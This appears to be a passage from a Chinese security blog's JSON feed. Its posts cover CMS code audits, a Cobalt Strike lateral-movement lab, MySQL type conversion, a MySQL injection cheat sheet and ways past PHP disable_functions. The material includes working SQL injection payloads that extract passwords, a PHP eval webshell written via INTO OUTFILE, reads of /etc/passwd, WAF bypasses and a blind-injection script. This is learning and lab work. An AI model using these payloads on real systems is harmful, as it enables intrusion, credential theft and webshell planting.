https://github.com/EmpireProject/Empire …. 0x04参考链接https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/?view=powershell-6 https://lesca.me/archives/powershell-tutorial-basics.html https://www.cnblogs.com/sparkdev/p/7460518.html https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression https://jkme.github.io/powershell-elf.html https://www.hackingarticles.in/window-privilege-escalation-via-automated-script/ https://www.freebuf.com/sectool/131393.html http://byd.dropsec.xyz/2019/03/27/Linux%E3%80%81Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%B8%B8%E7%94%A8%E5%90%8E%E9%97%A8%E6%80%BB%E7%BB%932/","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://boombao.net/categories/渗透测试/"}],"tags":[{"name":"powershell","slug":"powershell","permalink":"https://boombao.net/tags/powershell/"}]},{"title":"CMS代码审计(二)","slug":"audit-2","date":"2019-09-09T10:58:55.000Z","updated":"2019-09-18T04:55:10.179Z","comments":true,"path":"2019/09/09/audit-2/","link":"","permalink":"https://boombao.net/2019/09/09/audit-2/","excerpt":"本文首发于90sec","text":"本文首发于90sec 0x01 分析想找点小型的cms审计一下练练手，谷歌一搜，跳出来一个xiaocms，就决定是你了~，大佬都分析过了，自己再完整的分析一遍。 这套cms最新版发布时间是14年，应该是停止更新了。 MVC架构，看官网介绍还是用了PDO预编译… 注入基本是没戏了 从系统入口开始，include xiaocms.php,xiaocms.php定义了一些全局变量，路由解析规则，控制器加载规则等东西。没有a和c参数时默认访问index方法。对控制器访问做了一定的限制，过滤了斜杠/。 作者重写了get和post方法，对传入的参数使用htmlspecialchars过滤了&lt;&gt;&quot;等。 获取ip的函数也做了限制，哇难受的一批 太菜了，转战后台。 0x02 正文假设进入了后台，就要考虑怎么getshell，最平常的思路就是文件上传。看一下这套cms的上传逻辑。 upload.class.php中 跟进函数 看一下$limit_type是个啥，跟进去发现是个变量… 不应该哇，再一看，通过set_limit_type函数设置白名单，这… 全局搜索一下upload函数，看看调用情况。找来找去都在admin/uploadfile.php中。 通读该文件，各种上传方式实现，编辑器上传，直接上传等。 在编辑器上传和uploadify_upload两处调用了upload函数,只有后者才能控制type。 后边的判断是加水印的，无关痛痒。 本地构造一个表单手动上传。 后台也有模板管理的功能，一开始看后缀都是html就没多想，后来看其他师傅的分析才明白过来..模板也是要被包含进php文件的, 太菜了(⸝⸝⸝ᵒ̴̶̥́ ⌑ ᵒ̴̶̣̥̀⸝⸝⸝) 所以可以后台编辑模板，写入phpinfo,就能执行。分析一下原因 后台编辑模板url为http://127.0.0.1/xiaocms/admin/index.php?c=template&amp;a=edit&amp;dir=&amp;file=index.html template.php中的editAction方法 判断file的后缀是否合法，然后使用file_put_contents把file_content的值写入文件，注意一下，本来post方法使用了htmlspecialchars函数进行过滤，此处又进行了解码,所以写入的还是原来传入的内容。 此时php代码只是在html文件中，它是怎么被加载的呢？ 继续往下走，假设我们修改了index.html模板文件，访问index.php时会触发php代码，跟进indexAction函数，不传入任何参数默认执行index方法。 问题应该是出在display函数，跟进去看一下 view.class.php 34行 首先获取html文件的内容，然后获取缓存文件，如果html对应的缓存文件与源html都存在，就调用load_view_file函数。 该函数调用handle_view_file对cms规定的一些标签进行替换,但是没有足够的过滤。 最后通过create_compile_file函数写入缓存文件，最后包含该缓存文件，导致任意php代码被执行。 0x03 插曲因为这套cms早就停止更新了，官网推荐使用另一个cms，顺便瞅了瞅，应该是在xiaocms的基础上开发的，安全做的可以，传入的参数使用PDO预编译，对上传文件的type和后缀都做了严格的白名单限制，前台功能点太少，无望，但是后台某些地方还是有相同问题的，比如说模板文件getshell,触发点还是相同的，还是上边分析的文件包含，感兴趣的师傅可以分析一下。 0x04 总结审计时要白+黑，白盒+黑盒测试一起，关注一下底层的一些过滤函数以及sql处理 上传逻辑等，根据功能点进行代码分析，最重要的是有耐心吧=。= 这次看的还是不够仔细啊，后台还可以尝试配置文件写shell，但是会多一个单引号，导致代码不解析，因为存在var_export的原因，这一点在审计minicms时也遇见过。 up up!!!(ง •̀-•́)ง","categories":[{"name":"code","slug":"code","permalink":"https://boombao.net/categories/code/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://boombao.net/tags/代码审计/"}]},{"title":"初探cobaltstrike(一)","slug":"cobalt-strike-1","date":"2019-09-04T08:09:59.000Z","updated":"2019-09-04T08:18:41.561Z","comments":true,"path":"2019/09/04/cobalt-strike-1/","link":"","permalink":"https://boombao.net/2019/09/04/cobalt-strike-1/","excerpt":"趁着有时间，把不懂的学一学(๑•̀ㅂ•́)و✧.","text":"趁着有时间，把不懂的学一学(๑•̀ㅂ•́)و✧. 基础启动先启动一个服务端 ./teamserver ip password 启动客户端连接 ./cobaltstrike User随便输，Password是启动服务端时的密码。 模块介绍Cobalt Strike123456New Connection 创建一个新连接Perferences 修改一些字体信息啥的，也可以在TeamServers处删除登录凭证Visualization 显示的模式VPN interfaces vpn配置（未测试）Listensers 监听器，可以执行添加/编辑/移除监听等操作Script Manager 字面意思 脚本管理 脚本也是cs的一大杀器。 View12345678910Applications 用于显示 System Profiler 获取的目标浏览器，操作系统，flash版本Credentials 显示所有已经获取的用户主机hashDownloads 显示下载的文件Event log 事件日志 记录团队 目标上线等记录Keystrokes 目标键盘记录Proxy Pivots 代理信息Screenshots 屏幕截图Script Console 加载自定义脚本Targets 显示所有主机Web log web服务日志 Attacks12345678910111213141516171819PackagesHTML Application 生成hta文件MS Office Macro 宏office文件Payload Generator 生成各种语言版本的payloadUSB/CD AutoPlay 利用自动播放运行的被控端文件Windows Dropper 捆绑器可将任意正常的文件Windows Executable payload生成可执行文件Windows Executable (S) 无状态------------------------------------------Web Drive-by Manage 开启的所有web服务Clone Site 克隆网站 Host File 提供Web以供下载某文件Scripted Web Delivery 为payload提供web服务以便于下载和执行Signed Applet Attack 启动一个Web服务以提供自签名Java Applet的运行环境Smart Applet Attack 自动检测Java版本并l利用已知的exploits绕过securitySystem Profiler 获取系统，Flash，浏览器版本等-------------------------------------------Spear Phish 鱼叉式网络钓鱼 基本操作首先，我们设置一个监听，Cobalt Strike-&gt;Listensers-&gt;Add ，cs提供了八种方式。 12345678windows/beacon_dns/reverse_dns_txtwindows/beacon_dns/reverse_httpwindows/beacon_http/reverse_httpwindows/beacon_https/reverse_httpswindows/beacon_smb/bind_pipe 即 SMB Beaconwindows/foreign/reverse_httpwindows/foreign/reverse_httpswindows/foreign/reverse_tcp 开启以后，为了测试方便，我们直接生成一个马，传到靶机上。 Attacks-&gt;Windows Executable 生成一个64位木马，然后绑定到一开始创建的监听test1上。 靶机运行exe以后cs接收到一个Beacon(信标标志之类的意思)。类似于msf的meterpreter。 右键Interact,与beacon交互。输入help查阅能够执行的命令。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293beacon&gt; helpBeacon Commands=============== Command Description ------- ----------- browserpivot Setup a browser pivot session bypassuac Spawn a session in a high integrity process cancel Cancel a download that&apos;s in-progress cd Change directory checkin Call home and post data clear Clear beacon queue covertvpn Deploy Covert VPN client cp Copy a file dcsync Extract a password hash from a DC desktop View and interact with target&apos;s desktop dllinject Inject a Reflective DLL into a process dllload Load DLL into a process with LoadLibrary() download Download a file downloads Lists file downloads in progress drives List drives on target elevate Try to elevate privileges execute Execute a program on target (no output) execute-assembly Execute a local .NET program in-memory on target exit Terminate the beacon session getprivs Enable system privileges on current token getsystem Attempt to get SYSTEM getuid Get User ID hashdump Dump password hashes help Help menu inject Spawn a session in a specific process jobkill Kill a long-running post-exploitation task jobs List long-running post-exploitation tasks kerberos_ccache_use Apply kerberos ticket from cache to this session kerberos_ticket_purge Purge kerberos tickets from this session kerberos_ticket_use Apply kerberos ticket to this session keylogger Inject a keystroke logger into a process kill Kill a process link Connect to a Beacon peer over SMB logonpasswords Dump credentials and hashes with mimikatz ls List files make_token Create a token to pass credentials mimikatz Runs a mimikatz command mkdir Make a directory mode dns Use DNS A as data channel (DNS beacon only) mode dns-txt Use DNS TXT as data channel (DNS beacon only) mode dns6 Use DNS AAAA as data channel (DNS beacon only) mode http Use HTTP as data channel mode smb Use SMB peer-to-peer communication mv Move a file net Network and host enumeration tool note Assign a note to this Beacon portscan Scan a network for open services powerpick Execute a command via Unmanaged PowerShell powershell Execute a command via powershell.exe powershell-import Import a powershell script ppid Set parent PID for spawned post-ex jobs ps Show process list psexec Use a service to spawn a session on a host psexec_psh Use PowerShell to spawn a session on a host psinject Execute PowerShell command in specific process pth Pass-the-hash using Mimikatz pwd Print current directory reg Query the registry rev2self Revert to original token rm Remove a file or folder rportfwd Setup a reverse port forward run Execute a program on target (returns output) runas Execute a program as another user runasadmin Execute a program in a high-integrity context runu Execute a program under another PID screenshot Take a screenshot setenv Set an environment variable shell Execute a command via cmd.exe shinject Inject shellcode into a process shspawn Spawn process and inject shellcode into it sleep Set beacon sleep time socks Start SOCKS4a server to relay traffic socks stop Stop SOCKS4a server spawn Spawn a session spawnas Spawn a session as another user spawnto Set executable to spawn processes into spawnu Spawn a session under another PID ssh Use SSH to spawn an SSH session on a host ssh-key Use SSH to spawn an SSH session on a host steal_token Steal access token from a process timestomp Apply timestamps from one file to another unlink Disconnect from parent Beacon upload Upload a file wdigest Dump plaintext credentials with mimikatz winrm Use WinRM to spawn a session on a host wmi Use WMI to spawn a session on a host 场景内网环境网络为了测试方便，本地使用VMware Station模拟两层内网，机器配置有限，就开了三个虚拟机，一台xp，一台win7，一台Ubuntu14.04,一层内网有Ubuntu和win7，内网机器有一台xp，其中win7位跳板机，可以访问内网。 在Vmware中可以通过添加网卡，然后将该网卡设置为LAN网段模式，然后在机器中固定ip。 过程现在我们假设通过一些手段拿到了win7的权限，可以执行命令，上传文件，我们可以通过cs生成一个木马上传到win7上，然后服务端创建一个Listener，就可以得到一个Beacon。 Attacks-&gt;Windows Executable 然后绑定Lsitener，在靶机上执行该文件，等待主机上线。 可以看到我们已经得到一个Beacon，默认的sleep时间为60s，我们本地测试就直接sleep 0，节约时间。 内外网ip 主机名 连接时间等都显示的很清楚。 看一下主机ip，是否存在内网或者是域，判断一下网络拓扑。shell ipconfig 有两个网卡，初步判断存在内网. 靶机上线后有三种视图，第一种在复杂的情况下直观的展示网络拓扑是怎样的，第二种比较简洁，列表的形式展示，第三种站在目标的角度，表明我们可以进行怎样的操作。第一种最炫(zhuang)酷(bi)！ 靶机处右键Interact,得到一个交互式的Beacon，输入help查看帮助。常规操作，查看权限，权限不够提权，抓hash 右键Access-&gt;DumpHash 尝试导出hash，提示权限不够，尝试提权. cs内置了几种提权方式，针对一些版本低的主机(win7)，可以通过添加自定义脚本来增强cs的功能。 gayhub上有个项目，收集了很多的自定义脚本：https://github.com/harleyQu1nn/AggressorScripts 导入几个试一下，导入了AV_Query elevate EDR三个脚本，其中elevate新提供了五种提权的方式。 使用AV_Query 看一下安装了啥防护软件,因为是虚拟机，我啥也没装，只有自带的windows defender 使用ms14-058提升权限，在交互式Beacon中可以看到进度： 完成后得到system权限的Beacon. 导出Hash,导出完成后点击图标栏中的名片图标，很直观的看到提取出的用户凭证。 如果内置的payload提权不成功，可以试一下进程注入的手法. 右键-&gt;access-&gt;explore-&gt;process list-&gt;inject (选择一个高权限且稳定的进程) 继续横向渗透,看一下同网段中有没有其他主机。 可以使用msf与cs联动，使用Spawn将Beacon派生到msf。 首先在cs中创建一个forgin的Listener，同时在msf中使用handler监听相同端口 靶机右键Spawn,msf中得到一个meterpreter 然后使用nmap或者是其他模块扫描 也可以使用cs自带的portscan explore-&gt;portscan ，扫描完成后可以看到内网中存在的主机列表。 发现还存活一台ubuntu 主机，此处假装通过爆破得到密码账号(滑稽），Login-&gt;ssh登录。 查看权限，不是root权限，尝试提权，upload上传linux-suggester-2.pl，看一下内核漏洞，记得上传后要给执行权限。 直接使用脏牛提权。 上边提到还有一层处在内网的主机，可以通过cs提供的Sock代理带入。 右键-&gt;Pivoting-&gt;SOCKS server 可以在View-&gt;Proxy Pivots中看到正在运行的代理。 kali自带proxychains,修改配置为socks4 127.0.0.1 port ，将三方工具带入。（小声bb，我本地测试的时候发现不行…可能是我操作问题） 在msf中还可以直接输入setg Proxies socks4:team server IP:proxy port 将其带入内网。 输入setg ReverseAllowProxy true 保证收到回连的数据。 内网xp直接上ms08-067，得到meterpreter通过payload_inject模块转给cs。 详细的操作可以看[https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/%E7%AC%AC%E5%8D%81%E5%85%AD%E8%8A%82%5BMSF%E4%B8%8ECS%E4%BC%9A%E8%AF%9D%E4%BA%92%E8%BD%AC%5D.md] ==! 自己测试的时候出了一些问题，暂时没解决，先放一边… 假设我们已经完成上述步骤… ，再看下这时候的拓扑 问题内网xp无法访问，自带的代理与其他的socks代理工具都试过了，无法带入内网，后来发现是环境问题，个人机器没有抓发功能，导致数据过不去==！也尝试了仅主机模式，木得行o(一︿一+)o…., 先挖个坑吧，以后来填坑~ 最后上述介绍的都是cs的一些基本语法以及使用手段，后续可能会更新cs一些进阶用法，文章有不足或者任何错误，请各位大佬不吝赐教。感谢大佬们对cs的各种总结。╰(°▽°)╯ 参考链接https://rcoil.me/2018/04/Cobalt%20Strike学习 https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg https://blog.51cto.com/life2death/1618744 https://mp.weixin.qq.com/s/tqOv6p9NhKpo6Isz5jBuKw https://xz.aliyun.com/t/4191 https://wbglil.gitbooks.io/cobalt-strike/ https://github.com/aleenzz/Cobalt_Strike_wiki","categories":[{"name":"安全工具","slug":"安全工具","permalink":"https://boombao.net/categories/安全工具/"}],"tags":[{"name":"安全","slug":"安全","permalink":"https://boombao.net/tags/安全/"},{"name":"cobalt_strike","slug":"cobalt-strike","permalink":"https://boombao.net/tags/cobalt-strike/"},{"name":"tools","slug":"tools","permalink":"https://boombao.net/tags/tools/"}]},{"title":"CMS代码审计(一)","slug":"audit-1","date":"2019-09-01T02:16:55.000Z","updated":"2019-09-17T03:43:30.917Z","comments":true,"path":"2019/09/01/audit-1/","link":"","permalink":"https://boombao.net/2019/09/01/audit-1/","excerpt":"九月第一天，加油哇( •̀_•́ ) 记录一下代码审计的分析流程。","text":"九月第一天，加油哇( •̀_•́ ) 记录一下代码审计的分析流程。 1.系统重装漏洞利用条件 安装完成后未删除install.php文件。 漏洞分析定位到install.php，第6行位置 判断了是否存在install.lock文件，然后没有下文了。。。可能是开发失误。 漏洞复现安装完成 然后访问install.php 可以重装 2.后台xss(滑稽) 3.sql语句暴露 4.后台sql注入(鸡肋)漏洞复现访问url: http://127.0.0.1/uqcms/index.php/admin/ad/save post提交数据 alias=1#&amp;id=1 and updatexml(1,concat(0x7e,(select/**/user()),0x7e),1)#&amp;name=2&amp;px=0 漏洞分析admin/ad_class.php 第62行 通过P函数获取id的值，跟进P函数 因为传入的是false,去掉空格后直接返回，没有任何过滤。 5. 前台sql注入利用条件需要注册一个会员账号， 在修改收货地址处抓包，修改id参数，id参数未过滤，可报错注入，得到数据。 漏洞复现 漏洞分析home/address.class.php 文件，第35行位置 通过P函数获取后直接传入sql语句进行查询。 sql注入在这套cms里应该是不少…，以上只是举个例子，开发者把希望寄托在了360_safe.php提供的过滤规则上… ，虽然过滤大部分，但是没有过滤报错函数，POST方式没有过滤单引号。 6. 文件上传本地上传正常图片也不行，没进一步测试，附上先知社区大佬分析 https://xz.aliyun.com/t/6075 最后代码审计的能力太弱，希望自己能坚持下去，写成一个系列文章吧！","categories":[{"name":"code","slug":"code","permalink":"https://boombao.net/categories/code/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://boombao.net/tags/代码审计/"}]},{"title":"mysql隐式类型转换及其安全问题","slug":"fasle-mysql-injection","date":"2019-08-25T08:07:46.000Z","updated":"2019-08-25T08:09:14.239Z","comments":true,"path":"2019/08/25/fasle-mysql-injection/","link":"","permalink":"https://boombao.net/2019/08/25/fasle-mysql-injection/","excerpt":"测试时发现的一点小问题。","text":"测试时发现的一点小问题。 所谓的隐式类型转换，就是在不使用转换函数的情况下，默认转换了类型，比方说定义一个varchar变量id，传入了一个非预期类型的值，就会转换类型然后带入语句查询。说到底是忽略了不同数据类型之间是否兼容。 隐式类型转换有时会导致无法使用索引的风险，尤其是在高并发的情况下，不走索引就会全盘搜索，进行N多次I/O操作，占用很多资源而且浪费时间。 规则看一下转换规则： mysql官方文档 翻译过来的规则如下(半机翻)： 如果是一个或两个参数NULL，则比较的结果是NULL，除了NULL-safe &lt;=&gt; 等式比较运算符。因为NULL &lt;=&gt; NULL，结果是真的。无需转换。 如果比较操作中的两个参数都是字符串，则将它们作为字符串进行比较。 如果两个参数都是整数，则将它们作为整数进行比较。 如果不与数字进行比较，十六进制值将被视为二进制字符串。 如果其中一个参数是TIMESTAMP 或DATETIME列而另一个参数是常量，则在执行比较之前将常量转换为时间戳。 有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较. 所有其他情况下，两个参数都会被转换为浮点数再进行比较. 测试实例test_table表中有username字段，varchar类型 正常情况下： 当我们输入0时， 会返回全部的数据，这是为什么？ 看上边的规则，最后一条，其他情况下，会转换成浮点数进行比较，字符串转浮点数会失败，就像php弱类型一样，mysql有没有类似的机制呢？尝试一下 1234567891011121314151617181920212223mysql&gt; select 1=&apos;aaa&apos;,1=&apos;1aaa&apos;,1=&apos;2aaa&apos;,1=&apos;123aaa&apos;,1=1.0;+---------+----------+----------+------------+-------+| 1=&apos;aaa&apos; | 1=&apos;1aaa&apos; | 1=&apos;2aaa&apos; | 1=&apos;123aaa&apos; | 1=1.0 |+---------+----------+----------+------------+-------+| 0 | 1 | 0 | 0 | 1 |+---------+----------+----------+------------+-------+1 row in set, 4 warnings (0.00 sec)mysql&gt; select 1=&apos;aaa&apos;,1=&apos;1aaa&apos;,2=&apos;2aaa&apos;,123=&apos;123aaa&apos;,1=1.0;+---------+----------+----------+--------------+-------+| 1=&apos;aaa&apos; | 1=&apos;1aaa&apos; | 2=&apos;2aaa&apos; | 123=&apos;123aaa&apos; | 1=1.0 |+---------+----------+----------+--------------+-------+| 0 | 1 | 1 | 1 | 1 |+---------+----------+----------+--------------+-------+1 row in set, 4 warnings (0.00 sec)mysql&gt; select 2 = &apos;a2&apos;;+----------+| 2 = &apos;a2&apos; |+----------+| 0 |+----------+1 row in set, 1 warning (0.00 sec) 从上边可以看出，字符串转成浮点数时会失败，如果字符串开头为数字，会在字母处截断，只取数字作为转换后的结果，所以username=0时会返回所有的结果，因为插入的数据都不是以数字开头的，转换时都会转成0，0=0，满足条件所以输出。 sql注入中的利用查了查资料，有大佬已经总结过了，陕西省网络安全大赛中出过一道这样的题目，详情可以看这里 参考链接https://dev.mysql.com/doc/refman/5.7/en/type-conversion.html https://www.anquanke.com/post/id/86021 https://www.cnblogs.com/rollenholt/p/5442825.html","categories":[{"name":"安全","slug":"安全","permalink":"https://boombao.net/categories/安全/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://boombao.net/tags/sql注入/"}]},{"title":"mysql注入备忘录(不断更新...)","slug":"mysql-injection-guide","date":"2019-08-22T06:03:39.000Z","updated":"2019-08-24T09:52:23.354Z","comments":true,"path":"2019/08/22/mysql-injection-guide/","link":"","permalink":"https://boombao.net/2019/08/22/mysql-injection-guide/","excerpt":"记录一下mysql手工注入语句，随拿随用。","text":"记录一下mysql手工注入语句，随拿随用。 常用函数查看版本 version() @@version //@@是系统变量 查看数据库 database() schema() 查看用户 user() current_user() system_user() 查看路径 select @@basedir 字符串相关 length() concat() //连接字符串 concat_ws(flag,s1,s2...) //同concat函数，每个字符要加上flag left(s,n) //返回s开始的最左边n个字符 right(s,n) //返回s开始的最右边的n个字符 repeat(s,n) //重复字符串s n次 substring(s,n,len) //获取字符串s从n开始长度为len的字符串 mid(s,n,len) //同上sub ascii(s) // 获取s的ascii值 group_concat() //连接字符串 条件判断if(expr,v1,v2) // 如果表达式成立，执行v1，否则执行v2 case when then 12345case expr when case1 then 1 when case2 then 2 else 3end case 注入方式 有回显的普通注入 报错注入(有回显) 头注入(X-Forwarded-For/UA头/cookie注入/...) insert注入 update注入 // 一般为报错注入 delete 注入 宽字节注入 盲注 布尔盲注 根据返回结果的差异来判断 时间盲注 根据是否延时来判断条件是否成立 二次注入 insert + select类型 update + select类型 … order by注入 注入点判断 字符型 12345id =1&apos; and &apos;1&apos;=&apos;1 #id =1&apos; and &apos;1&apos;=&apos;2 #id =1&apos; or &apos;1&apos;=&apos;1 #id =1&apos; or &apos;1&apos;=&apos;2 # &apos; &quot; &apos;) &quot;) //常见闭合方式 数字型 1234id = 1 and 1 =1 #id = 2 and 1= 2 #id = 1 or 1 = 1 #id = 2 or 1 = 2 # 注入语句有回显普通手工注入1234567891011121314id = 1 order by 3# // 条件为真，才能进行order by 查询id = -1 union select 1,2,3 # //前面条件为假，而且前后查询列数要相等SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA #SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() #SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database_name #SELECT GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=table_name # SELECT GROUP_CONCAT(column_1,column_2) FROM database_name.table_name #SELECT load_file(&apos;/etc/passwd&apos;)SELECT &apos;&lt;?php @eval($_POST[1]);?&gt;&apos; into outfile &apos;/var/www/html/shell.php&apos;;show variables like &apos;%secure%&apos;; // 查看权限secure_file_priv= 可以读取目录secure_file_priv=NULL 不能读取secure_file_priv=C:\\ 只能读取C盘 报错注入updatexml(长度限制 32位)12345id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))id=1 and (updatexml(1,concat(0x7e,(select database()),0x7e),1))id=1 and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&apos;test&apos;),0x7e),1))id=1 and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;test&apos; and table_name=&apos;user&apos;),0x7e),1)) id=1 and (updatexml(1,concat(0x7e,(select group_concat(password) from user),0x7e),1)) floor1?id=1 and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) exp1exp(~(select * from(select group_concat(table_name) from information_schema.tables where !(table_schema &lt;&gt; database()))a)) or &apos; extractvaluel(长度限制 32位)12345id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))id=1 and (extractvalue(1,concat(0x7e,(select database()),0x7e)))id=1 and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&apos;test&apos;),0x7e)))id=1 and (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;test&apos; and table_name=&apos;user&apos;),0x7e)))id=1 and (extractvalue(1,concat(0x7e,(select group_concat(password) from user),0x7e))) 盲注BENCHMARK(100000,MD5(1)) or sleep(5) 附上一个半成品吧，根据情况定制payload。 12345678910111213141516171819202122232425262728293031323334import requestsimport stringimport timeimport base64result = &apos;&apos;flag=the symbol of successful_dataurl = &quot;http:/xxx.com/index.php&quot;request = requests.session()prox = &#123;&quot;http&quot;:&quot;127.0.0.1:8080&quot;&#125;header=&#123;&quot;Host&quot;: &quot;test.dns.outnet&quot;,&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&quot;,&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,&quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;&#125;data=&#123; &quot;username&quot;:&quot;admin&quot;&#125;for i in range(1,50): for j in range(23,126): payload = &quot; &apos; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=the_name_of_table),&#123;0&#125;,1))=&#123;1&#125; # &quot;.format(i,j) #payload = &quot; &apos; or ascii(substr((select a from b),&#123;0&#125;,1))=&#123;1&#125; # &quot;.format(i,j) response = request.post(url=url,data=data,proxies=prox) time.sleep(1) if flag in response.text: result += chr(j) print(t) break DNSlog无回显注入没实践过，先记一下。 https://www.cnblogs.com/afanti/p/8047530.html 绕过方式过滤空格1234/**/ /*!*/union/**/select/*！union*/select 过滤关键字双写或者大小绕过 e.g: Uniunionon SeleSElectct 过滤逗号使用join函数代替 12select 1,2,3select (select 1)a join (select 2)b join (select 3)c 过滤单引号使用十六进制编码 正则匹配最大次数限制绕某些WAF时有奇效 https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html 杂七杂八查询字段名为关键字时需要使用反引号转义 数据库数据可能存在宽字节，需要转成十六进制再转成十进制。 …. 推荐破哥总结的注入笔记，破哥出品，必定精品~ https://p0sec.net/index.php/archives/117/","categories":[{"name":"安全","slug":"安全","permalink":"https://boombao.net/categories/安全/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://boombao.net/tags/sql注入/"},{"name":"web安全","slug":"web安全","permalink":"https://boombao.net/tags/web安全/"}]},{"title":"一个shell引发的思考","slug":"shell-analy","date":"2019-08-18T03:33:52.000Z","updated":"2019-08-24T09:53:48.699Z","comments":true,"path":"2019/08/18/shell-analy/","link":"","permalink":"https://boombao.net/2019/08/18/shell-analy/","excerpt":"起因最近在做内部靶场平台题目，其中一道题为爆破一句话木马，拿到key的值。","text":"起因最近在做内部靶场平台题目，其中一道题为爆破一句话木马，拿到key的值。 经过木马密码可以通过burp爆破得到 祭出菜刀，连上一句话，发现权限被限制的很死，基本关于文件操作以及命令执行的函数都被禁用了.. 但是没有禁用file_get_contents函数，所以可以直接读取文件获得key。 如果在实际中遇到这种环境，函数被禁，怎么绕过disable_function？ 绕过姿势，一般有这么几种： 寻找未被禁用的函数 系统组件绕过 通过LD_PRELOAD绕过 mod-cgi 绕过 执行自定义语句(自己实现函数功能，通过webshell执行) 第一种 敏感函数整理一下经常用的各类函数，方便查找。 php中读取文件可以使用以下函数： 1234567readfilefreadfile_get_contentsvar_dump(file(file_name)) // file函数返回值位数组show_sourcehightlight_file...... 在php中可以执行命令函数有： 1system,exec,shell_exec,passthru，pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link 列目录函数： 1234567opendirscandirglob(&apos;*&apos;) $path = dirname(__FILE__);$result = glob($path.&apos;/*.php&apos;);print_r($result);... 第二种 三方组件利用系统存在的组件漏洞执行命令，扩大战果。 Bash漏洞导致命令执行 ImageMagic绕过 imagecreatefromgd2 sendmail 第三种 LD_PRELOAD使用LD_PRELOAD 程序执行时要在动态链接库.so中寻找函数位置，这种绕过方式就是让程序去执行自定义的动态链接库，类似于mysql下的udf提权或者redis主从复制RCE方式。 LD_PRELOAD这个全局变量指定动态链接库文件，会在程序运行之前加载。 1export LD_PRELOAD = XXX/xx.so 如果可以上传文件，我们可以通过上传一个恶意的.so库文件，然后加载该文件。最后绕过php层面执行命令函数。 推荐一个复现环境： https://github.com/obolu/Bypass_Disable_functions 第四种 mod_cgi+.htaccess在启用mod_cgi的apache服务器中，必须允许.htaccess以及有可写权限，要求有点苛刻。 在apache配置中有Options以及Addhandler指令，前者用来控制目录选项，比方说是否允许目录遍历，是否允许访问等，后者用来指定特定后缀名的文件所对应的处理方式，在解析漏洞中就有这样的用法，上传带少见后缀的恶意文件，修改.htaccess文件达到执行代码的目的。 这种绕过方式就是通过将要执行的程序写入带有特定拓展名的文件内，修改.htaccess文件，将恶意文件交给cgi处理。 具体的原理可以查阅 https://www.cnblogs.com/hookjoy/p/8988862.html 第五种 自定义语句通过编写php代码，用php最基础的底层函数实现一些被禁用的函数。 在本题目中，常见的列目录函数被禁用，包括readdir，opendir等函数，可以使用自定义语句列目录，也可以使用scandir函数。 想到可以读其他路径文件，说不定可以读到一些服务器的敏感信息啥的，看一下phpinfo中的open_basedir配置，限定了访问目录，只能访该题目所在目录。 查阅资料后发现，可以通过glob伪协议绕过限制，读取栏目。 123456$path = dirname(__FILE__);$result = glob($path.&apos;/*.php&apos;);print_r($result);//简化版$a = &quot;glob:///*&quot;;print_r(scandir($a)); 可以看到读到了根目录，但是没有足够权限读取/root/下的文件。需要借助其他的方式提升权限。 最后发现该靶机是一台虚拟主机之类的单独空间，没有其他题目的key，== ！ 姜还是老的辣啊2333 最后附上l3m0n大佬的github链接，里边记录了各种绕过姿势 https://github.com/l3m0n/Bypass_Disable_functions_Shell 参考链接https://www.anquanke.com/post/id/175403 https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html","categories":[{"name":"安全","slug":"安全","permalink":"https://boombao.net/categories/安全/"}],"tags":[{"name":"webshell","slug":"webshell","permalink":"https://boombao.net/tags/webshell/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://boombao.net/tags/渗透测试/"}]}]}